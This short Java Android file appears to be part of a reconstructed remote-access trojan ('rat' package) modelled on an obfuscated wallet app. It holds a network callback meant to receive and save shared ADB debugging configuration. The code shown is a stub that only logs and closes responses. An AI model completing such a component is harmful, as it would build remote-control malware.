package com.vendor.rat.network;

// ADAPT: vendor = com.guard.wallet.http.y (ShareADBConfigCallback)

import android.util.Log;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;

/**
 * ShareADBConfigCallback - ADB配置共享回调
 * vendor: 解析 ApiResult<ADBConfig>，成功后保存 ADB 配置
 */
public final class y implements Callback {

    private static final String TAG = "ShareADBConfigCallback";

    @Override
    public void onFailure(Call call, IOException e) {
        Log.e(TAG, "request failed", e);
    }

    @Override
    public void onResponse(Call call, Response response) throws IOException {
        try {
            String body = response.body() != null ? response.body().string() : "";
            Log.d(TAG, "response: " + response.code());
            // ADAPT: vendor parses ApiResult<ADBConfig>, saves ADB config via h.A()
        } catch (Exception e) {
            Log.e(TAG, "parse error", e);
        } finally {
            response.close();
        }
    }
}
